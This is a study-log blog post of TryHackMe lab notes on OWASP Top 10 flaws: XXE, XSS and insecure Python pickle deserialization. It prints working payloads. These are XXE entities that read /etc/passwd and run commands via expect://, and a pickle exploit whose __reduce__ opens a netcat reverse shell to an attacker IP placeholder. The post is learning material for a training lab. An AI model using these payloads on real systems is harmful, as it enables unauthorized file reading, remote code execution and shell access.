---
title: 'TryHackMe: Complete Beginner'
date: 2021-10-06 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2021-10-06-tryhackme-complete-beginner.html
author: 100007
---

# TryHackMe: Complete Beginner

**author:** Nathan Acks  
**date:** 2021-10-06

# OWASP Top 10

## (Severity 04) XML External Entity

As with injection attacks, XML external entity (XXE) attacks are broken down into two types: in-band (analogous us to active injection attacks) and out-of-band (OOB-XXE or “blind” XXE, which are of course analogous to blind injection attacks).

The encoding/version bit of an XML document is called the “prolog”.

```
<?xml version="1.0" encoding="UTF-8"?>
```

Also, there is one and only one root element in an XML document. And XML is case-sensitive. Whee!

DTDs look very XML-like themselves. Using the actual example from TryHackMe, this DTD:

```
<!DOCTYPE note [
<!ELEMENT note (to, from, heading, body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
```

Defines this XML:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>foo</to>
<from>bar</from>
<heading>baz</heading>
<body>etc.</body>
</note>
```

(`#PCDATA` indicates “parsable character data” - an XML-encoded string.)

There are three basic important XML bits here:

- `!DOCTYPE` defines the document type _and_ the root element.
- `!ELEMENT` defines additional elements (so if I understand this correctly, a !DOCTYPE declaration must contain at least one !ELEMENT with the same name).
- `!ENTITY` defines entities like `&gt;` - basically shortcuts for other data. There seems to be a lot more to XML entities than just this though…

The SYSTEM keyword can be included in !ENTITY declarations (or in the XML document !DOCTYPE declaration), and means “read this from the current system”.

Basically, you can think of the bit between the brackets (`[]`) in the DTD as getting slotted into the URI specifying the DTD in the XML !DOCTYPE. In fact, we can insert additional document type definitions into the end of a !DOCTYPE statement in this way; combining this with the SYSTEM declaration can allow us to read any files the webserver has access to.

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM "file:///etc/passwd">]>
<root>&read;</root>
```

This basically strikes me as more-or-less the same thing as an injection attack, just that we’re targeting the XML parser rather than the website code.

RCE through XEE is apparently rare, but can be achieved via the PHP expect module.

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxerce SYSTEM "expect://id">]>
<root>&xxerce;</root>
```

It looks like this is something that would be more commonly attacked over an API than directly through a web front-end.

- [2021-10-05 - TryHackMe: Complete Beginner](https://cardboard-iguana.com/log/2021-10-05-tryhackme-complete-beginner.html)
- [ENTITY Declaration](https://xmlwriter.net/xml_guide/entity_declaration.shtml)
- [Exploitation: XML External Entity (XXE) Injection](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection)

## (Severity 06) Security Misconfiguration

Basically, this about the use of defaults or bad configurations of existing security controls, whereas “broken access control” (which didn’t really include anything worth noting explicitly) is about missing or non-functional controls.

## (Severity 07) Cross-Site Scripting

Three varieties:

- Stored XSS (saved to the website database)
- Reflected XSS (included in the user request, for example via a malicious link)
- [DOM-Based XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29) (a little unclear what this is, but it looks like it’s basically similar to a reflection attack except that everything happens client-side)

[XSS-Payloads is a library of potentially useful XSS tools.](http://www.xss-payloads.com/)

Mostly, this is about injecting `<script/>` tags.

## (Severity 08) Insecure Deserialization

Basically, this is about trusting user-provided input to determine state.

On the low end, this can be something like using a cookie to determine user privileges.

But on the high end, if the application is actually _executing_ data provided by the user _as code_.

So what’s the difference between this and injection? (As far as I can tell) In command injection we’re abusing an existing function to get the web application to run a command (system, SQL, whatever) for us, while insecure deserialization is specifically about manipulating the internal state of the application (which can include the before-mentioned data-as-code trick).

Where the name of this vulnerability starts to make more sense is when the application is encoding (serializing) objects or other data structures, storing them on the user side, and then decoding (deserializing) the structure at a later time and using / trusting it without further checks.

In the TryHackMe example we’re attacking the Python pickle.loads() operation, which reconstructs objects from an encoded data stream. When an object is reconstructed it is actually fully initialized, which means that things like `object. __reduce__ ()` are run.

[This post is much clearer than TryHackMe when it comes to explaining how we’re attacking pickle.loads().](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

Anyways, the TryHackMe room has us use the following code to create a malicious base64 encoded object to feed pickle.loads() (YOUR\_TRYHACKME\_VPN\_IP gets replaced by your VPN IP):

```
#!/usr/bin/env python

import pickle
import sys
import base64
command = 'rm /tmp/f; '
command += 'mkfifo /tmp/f; '
command += 'cat /tmp/f | '
command += '/bin/sh -i 2>&1 | '
command += 'netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'
class rce(object):
def __reduce__ (self):
import os
return (os.system,(command,))
print(base64.b64encode(pickle.dumps(rce())))
```

What’s getting encoded here is the `rce` class. Python will call `rce. __reduce__ ()` to determine how to initialize this class when pickle.loads() deserializes it, and ` __reduce__ ()` wil return the tuple `(os.system, (command,))`, where `command` is basically our standard Metasploit reverse shell. Python then initializes the class by using os.system to call `command`, and there’s our reverse shell!

(SIDE NOTE: Isn’t `nc` a more common name for `netcat`? Debian provides links to both in /etc/aleternatives, but it seems best not to assume we’re on a Debian system…)

- [pickle - Python object serialization](https://docs.python.org/3/library/pickle.html)
